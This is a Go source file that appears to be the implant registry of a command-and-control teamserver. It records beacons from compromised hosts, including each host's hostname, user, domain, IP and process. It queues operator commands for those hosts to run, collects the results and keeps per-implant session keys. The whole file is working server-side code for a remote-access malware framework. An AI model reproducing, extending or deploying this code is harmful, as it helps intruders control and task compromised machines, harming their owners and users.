package implant

import (
	"encoding/json"
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/darknexus/teamserver/internal/db"
	"github.com/darknexus/teamserver/internal/events"
	"github.com/google/uuid"
)

// Registry manages active implants and their task queues
type Registry struct {
	db       *db.Database
	sessions map[string]*SessionKey
	mu       sync.RWMutex
}

// SessionKey holds per-implant encryption key
type SessionKey struct {
	Key       []byte
	CreatedAt time.Time
}

// CheckinRequest is what the implant sends on each beacon
type CheckinRequest struct {
	ID          string `json:"id"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	Domain      string `json:"domain"`
	InternalIP  string `json:"internal_ip"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	PID         int    `json:"pid"`
	ProcessName string `json:"process_name"`
	Sleep       int    `json:"sleep"`
	Jitter      int    `json:"jitter"`
}

// CheckinResponse is sent back to the implant
type CheckinResponse struct {
	Tasks []TaskPayload `json:"tasks"`
}

// TaskPayload is a command sent to the implant
type TaskPayload struct {
	ID      string `json:"id"`
	Command string `json:"command"`
	Args    string `json:"args"`
}

// TaskResult is what the implant sends back after executing a command
type TaskResult struct {
	TaskID string `json:"task_id"`
	Status string `json:"status"`
	Output string `json:"output"`
}

func NewRegistry(database *db.Database) *Registry {
	return &Registry{
		db:       database,
		sessions: make(map[string]*SessionKey),
	}
}

// HandleCheckin processes an implant check-in
func (r *Registry) HandleCheckin(req *CheckinRequest, externalIP string) (*CheckinResponse, error) {
	r.mu.Lock()
	defer r.mu.Unlock()

	// check if this is a new implant
	existing, err := r.db.GetImplant(req.ID)
	isNew := err != nil || existing == nil

	imp := &db.Implant{
		ID:          req.ID,
		Hostname:    req.Hostname,
		Username:    req.Username,
		Domain:      req.Domain,
		InternalIP:  req.InternalIP,
		ExternalIP:  externalIP,
		OS:          req.OS,
		Arch:        req.Arch,
		PID:         req.PID,
		ProcessName: req.ProcessName,
		Sleep:       req.Sleep,
		Jitter:      req.Jitter,
		Channel:     "https",
		LastSeen:    time.Now(),
		Alive:       true,
	}

	if isNew {
		imp.FirstSeen = time.Now()
		if err := r.db.RegisterImplant(imp); err != nil {
			return nil, fmt.Errorf("failed to register implant: %w", err)
		}
		log.Printf("[registry] new implant: %s (%s@%s)", req.ID[:8], req.Username, req.Hostname)
		events.Emit(events.EventImplantNew, imp)
		r.db.LogEvent("system", "implant_new", fmt.Sprintf("New implant %s from %s@%s (%s)", req.ID[:8], req.Username, req.Hostname, externalIP), req.ID)
	} else {
		r.db.UpdateImplantLastSeen(req.ID)
		events.Emit(events.EventImplantCheckin, map[string]string{"id": req.ID})
	}

	// get pending tasks for this implant
	pending, err := r.db.GetPendingTasks(req.ID)
	if err != nil {
		return nil, fmt.Errorf("failed to get tasks: %w", err)
	}

	var tasks []TaskPayload
	for _, t := range pending {
		tasks = append(tasks, TaskPayload{
			ID:      t.ID,
			Command: t.Command,
			Args:    t.Args,
		})
		// mark as sent
		r.db.UpdateTaskStatus(t.ID, "sent", "")
	}

	return &CheckinResponse{Tasks: tasks}, nil
}

// HandleTaskResult processes results from an implant
func (r *Registry) HandleTaskResult(results []TaskResult) error {
	for _, res := range results {
		if err := r.db.UpdateTaskStatus(res.TaskID, res.Status, res.Output); err != nil {
			log.Printf("[registry] failed to update task %s: %v", res.TaskID, err)
			continue
		}
		events.Emit(events.EventTaskCompleted, res)
	}
	return nil
}

// QueueTask adds a command to an implant's task queue
func (r *Registry) QueueTask(implantID, command, args, operator string) (*db.Task, error) {
	task := &db.Task{
		ID:        uuid.New().String(),
		ImplantID: implantID,
		Command:   command,
		Args:      args,
		Status:    "pending",
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
		Operator:  operator,
	}

	if err := r.db.CreateTask(task); err != nil {
		return nil, fmt.Errorf("failed to create task: %w", err)
	}

	argsPreview := args
	if len(argsPreview) > 50 {
		argsPreview = argsPreview[:50] + "..."
	}
	r.db.LogEvent(operator, "task_created", fmt.Sprintf("Queued %s for %s: %s", command, implantID[:8], argsPreview), implantID)
	events.Emit(events.EventTaskCreated, task)

	return task, nil
}

// SetSessionKey stores an encryption key for an implant
func (r *Registry) SetSessionKey(implantID string, key []byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.sessions[implantID] = &SessionKey{Key: key, CreatedAt: time.Now()}
}

// GetSessionKey retrieves an implant's session key
func (r *Registry) GetSessionKey(implantID string) ([]byte, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	sk, ok := r.sessions[implantID]
	if !ok {
		return nil, false
	}
	return sk.Key, true
}

// MarshalCheckinResponse serializes the response to JSON
func MarshalCheckinResponse(resp *CheckinResponse) ([]byte, error) {
	return json.Marshal(resp)
}
